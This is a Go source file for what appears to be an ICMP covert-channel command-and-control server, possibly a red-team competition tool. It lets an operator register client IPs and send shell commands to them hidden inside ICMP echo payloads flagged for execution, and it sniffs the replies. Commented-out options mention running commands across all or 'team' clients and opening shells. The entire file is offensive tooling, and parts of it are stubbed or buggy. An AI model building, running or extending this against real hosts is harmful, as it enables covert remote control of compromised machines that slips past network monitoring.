package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// var clients []client

// type client struct {
// 	name string
// 	id   int
// 	ip   string
// }

var DEBUG bool = true

var id int = 0
var clients = make(map[int]string)
var SSM bool = true
var execute = false
var PACKETQUEUE []icmp.Message

var (
	buffer = int32(1600)
	filter = "icmp[icmptype] == icmp-echoreply"
)

const (
	ProtocolICMP = 1
)

func print_title() {
	fmt.Println(".__                          ___             .__.__    ___")
	fmt.Println("|__| ____  __ ________      /  /   _______  _|__|  |   \\  \\")
	fmt.Println("|  _/ ___\\|  |  \\____ \\    /  /  _/ __ \\  \\/ |  |  |    \\  \\")
	fmt.Println("|  \\  \\___|  |  |  |_> >  (  (   \\  ___/\\   /|  |  |__   )  )")
	fmt.Println("|__|\\___  |____/|   __/    \\  \\   \\___  >\\_/ |__|____/  /  /")
	fmt.Println("        \\/      |__|        \\__\\      \\/               /__/")
}

func print_help() {
	fmt.Println("\tadd <IP ADDRESS>             Adds new client by IP")
	fmt.Println("\tls                           Show all added clients")
	fmt.Println("\trm <ID>                      Removes a client by ID")
	fmt.Println("\tremoveallclients             Removes all clients")
	// fmt.Println("\tsend <ID> <message>          Send message to client at ID")
	// fmt.Println("\texe <ID> <command>           Send command to client at ID")
	// fmt.Println("\tsendtoall <message>          Sends <message> to all clients")
	// fmt.Println("\texeonall <command>           Execute <command> on all clients")
	// fmt.Println("\tsendtoteam <team> <command>  Send <command> to all <team> clients")
	// fmt.Println("\texeonteam <team> <command>   Execute <command> on all <team> clients")
	// fmt.Println("\tloadclients                  Loads all clients specified in JSONFILE")
	// fmt.Println("\tcheckalive                   Generates a board of replying clients")
	// [FIX]fmt.Println("\tshell <ID>                   Creates a direct line with client at ID")
	fmt.Println("\tkill                         Stops server")
	// fmt.Println("\tssm                          Enables Super Secret Mode")
	fmt.Println("\thelp                         Prints this")
}

func addclient(ip string) {
	clients[id] = ip
	id += 1
}

func removeclient(id int) {
	if DEBUG {
		fmt.Println("Removing client", id)
	}
	delete(clients, id)
}

func removeallclients() {
	for k := range clients {
		delete(clients, k)
	}
}

func showclients() {
	keys := make([]int, 0, len(clients))
	for k := range clients {
		keys = append(keys, k)
	}
	sort.Ints(keys)
	for _, k := range keys {
		fmt.Print("Client ", k, " at ", clients[k])
	}
}

func generate_header(segments int) string {
	segHeader := strconv.Itoa(segments)
	header := ""
	if SSM && execute {
		header += "###11" + segHeader
	} else if SSM && !execute {
		header += "###10" + segHeader
	} else if !SSM && execute {
		header += "###01" + segHeader
	} else if !SSM && !execute {
		header += "###00" + segHeader
	} else {
		fmt.Println("How")
	}
	return header
}

func generate_packet(payload string, segment int) {
	// Recursivly calls generate packet if too large
	byteSize := len(payload)
	if byteSize > 1460 {
		fmt.Println("Conductor we have a problem!!!!!")
		firstPayload := payload[0:1460]
		nextPayload := payload[1460:byteSize]
		packet := icmp.Message{
			Type: ipv4.ICMPTypeEcho, Code: 0,
			Body: &icmp.Echo{
				ID: os.Getpid() & 0xffff, Seq: 1, //<< uint(seq), // TODO
				Data: []byte(generate_header(segment) + firstPayload),
			},
		}
		fmt.Println(len(PACKETQUEUE))
		PACKETQUEUE[segment] = packet
		generate_packet(nextPayload, segment+1)
	}

	packet := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: 1, //<< uint(seq), // TODO
			Data: []byte(generate_header(segment) + payload),
		},
	}
	fmt.Println(len(PACKETQUEUE))
	PACKETQUEUE[segment] = packet
}

func send_packets(addr string, c icmp.PacketConn) {
	for _, packet := range PACKETQUEUE {
		// fmt.Println("Packet:", addr)
		binaryEncoding, _ := packet.Marshal(nil)
		dst, _ := net.ResolveIPAddr("ip4", addr)
		anInt, err := c.WriteTo(binaryEncoding, dst)

		// fmt.Println(anInt, err)

		if err != nil {
			fmt.Println("I FAILED DOG")
		} else if anInt != len(binaryEncoding) {
			fmt.Println("YOU FELL OFF")
		}
	}

}

func deviceExists(name string) bool {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Panic(err)
	}
	for _, device := range devices {
		if device.Name == name {
			return true
		}
	}
	return false
}

func sniffer() {
	handler, err := pcap.OpenLive("\\Device\\NPF_Loopback", buffer, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()
	if err := handler.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}
	source := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range source.Packets() {
		payload := packet.ApplicationLayer().Payload()
		// fmt.Println(payload)
		fmt.Println(convert(payload), "received from [IP]")
	}
}

func convert(nums []byte) string {
	var converted string
	converted = bytes.NewBuffer(nums).String()
	return converted
}

func parse_id(id string) int {
	atoiclient, _ := strconv.Atoi(strings.TrimRight(id, "\r\n"))
	return atoiclient
}

func main() {
	print_title()
	// print_help()
	// addclient("127.0.0.1")
	// addclient("127.0.0.2")
	// showclients()
	var ListenAddr = "0.0.0.0"
	c, err := icmp.ListenPacket("ip4:icmp", ListenAddr)
	if err != nil {
		fmt.Println(err)
	}
	go sniffer()
	// devices, _ := pcap.FindAllDevs()
	// for _, device := range devices {
	// 	fmt.Println(device.Name)
	// }

	for {
		consoleReader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")

		input, _ := consoleReader.ReadString('\n')

		input = strings.ToLower(input)

		if strings.HasPrefix(input, "add") {
			tokens := strings.Split(input, " ")
			addclient(tokens[1])

		} else if strings.HasPrefix(input, "rm") {
			// tokens := strings.Split(input, " ")
			// id := parse_id(tokens)
			// removeclient(id)

		} else if strings.HasPrefix(input, "removeallclients") {
			removeallclients()

		} else if strings.HasPrefix(input, "ls") {
			showclients()

		} else if strings.HasPrefix(input, "exe") {
			// Parse command
			_, after, _ := strings.Cut(input, " ")
			id, command, _ := strings.Cut(after, " ")
			command = strings.TrimRight(command, "\r\n")

			// Create queue for packet sending
			PACKETQUEUE = make([]icmp.Message, (len(command)/1460)+1)

			clientid := parse_id(id)
			ipaddr := strings.TrimRight(clients[clientid], "\r\n")
			generate_packet(command, 0)
			if DEBUG {
				fmt.Println("[DEBUG]", command, "sent to", clients[clientid])
			}
			send_packets(ipaddr, *c)

		} else if strings.HasPrefix(input, "help") {
			print_help()

		} else if strings.HasPrefix(input, "kill") {
			print_title()
			os.Exit(0)

		} else {
			fmt.Println("Type \"help\" for list of commands.")
		}
	}
}
